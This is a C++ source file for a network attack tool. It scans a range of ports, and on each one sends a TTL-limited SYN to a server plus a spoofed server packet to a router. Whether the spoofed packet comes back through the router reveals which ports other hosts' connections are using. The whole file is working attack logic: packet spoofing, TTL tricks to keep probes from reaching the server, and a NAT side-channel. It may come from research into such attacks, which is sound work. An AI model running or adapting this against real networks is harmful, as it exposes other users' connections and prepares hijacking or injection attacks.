#include <iostream>
#include <limits>
#include <optional>
#include <random>
#include <thread>

#include "tcp-interface.hpp"
#include "tcp-packet.hpp"

#include "app.hpp"

namespace {

// Actually run the attack on a port given a configuration
RunStatus run(Configuration &config, TCPPacket::Address::Port scan_port);
// Send a packet, honoring the delay and redundancy settings
void send_pkt(Configuration &config, const TCPPacket &packet);

} // namespace

int main(int argc, char **argv) {

  // Get the values for this run
  Configuration config = Configuration::args(argc, argv);

  // Iterate over all the port numbers in the configuration. This is serial,
  // with no parallelization.
  for (TCPPacket::Address::Port p = config.scan_port_range.start;
       p <= config.scan_port_range.end; p++) {

    // Print out progress if we can
    if (!config.dumb_terminal)
      std::cout << "\r\E[KScanning port " << p << std::flush;

    // Run the attack on this port
    RunStatus status = run(config, p);

    // Print iff it was a hit
    if (status == RunStatus::OCCUPIED)
      std::cout << (config.dumb_terminal ? "" : "\r\E[K") << p << std::endl;
  }

  // Move the cursor back if needed
  if (!config.dumb_terminal)
    std::cout << "\r\E[K" << std::flush;
}

namespace {

RunStatus run(Configuration &config, TCPPacket::Address::Port scan_port) {

  // Compute the attacker and router address given the configuration and the
  // current port
  TCPPacket::Address attacker_addr{
      .ip = config.topology.attacker_ip,
      .port = scan_port,
  };
  TCPPacket::Address router_addr{
      .ip = config.topology.router_ip,
      .port = scan_port,
  };

  // Get a random number for the initial sequence numbers on both sides.
  // Remember to seed with a real random number generator.
  std::default_random_engine isn_engine{std::random_device{}()};
  std::uniform_int_distribution<uint32_t> isn_dist{
      0, std::numeric_limits<uint32_t>::max()};
  uint32_t attacker_isn = isn_dist(isn_engine);
  uint32_t server_isn = isn_dist(isn_engine);

  // Send a SYN packet to the server
  send_pkt(config, TCPPacket{
                       .src = attacker_addr,
                       .dst = config.topology.server_addr,
                       .ttl = config.topology.server_ttl_drop,
                       .seqno = attacker_isn,
                       .ackno = std::nullopt,
                       .syn = true,
                   });

  // Send a spoofed packet from the server to the router
  TCPPacket spoofed_to_router{
      .src = config.topology.server_addr,
      .dst = router_addr,
      .seqno = server_isn,
      .ackno = attacker_isn + 1,
      .syn = true,
      .fin = false,
  };
  send_pkt(config, spoofed_to_router);
  // The response we get back will have the destination changed. Remember that
  // and check incoming packets against it.
  TCPPacket spoofed_to_attacker = spoofed_to_router;
  spoofed_to_attacker.dst = attacker_addr;

  // Check to see if we actually received it. Make sure the attributes of the
  // packet match what we're expecting, otherwise, it could've been from an old
  // probe.
  std::optional<TCPPacket> response = config.topology.interface.receive(
      [&spoofed_to_attacker](const TCPPacket &pkt) -> bool {
        // Ignore reset packets
        if (pkt.rst)
          return false;
        // Check that all the attributes match exactly, except for the TTL field
        return pkt == spoofed_to_attacker;
      },
      config.timeout);

  // No matter what happens, send a RST packet. This will move us into the CLOSE
  // state, and that has a much shorter timeout than the SYN_RECV state.
  send_pkt(config, TCPPacket{
                       .src = attacker_addr,
                       .dst = config.topology.server_addr,
                       .ttl = config.topology.server_ttl_drop,
                       .seqno = attacker_isn + 1,
                       .ackno = server_isn + 1,
                       .rst = true,
                   });

  // If we didn't get anything, it means someone else is using this port
  if (!response.has_value()) {
    return RunStatus::OCCUPIED;
  }
  // Otherwise, we have this port free
  return RunStatus::FREE;
}

void send_pkt(Configuration &config, const TCPPacket &packet) {
  for (size_t i = 0; i < config.packet_redundancy; i++) {
    config.topology.interface.send(packet);
    std::this_thread::sleep_for(config.packet_delay);
  }
}

} // namespace
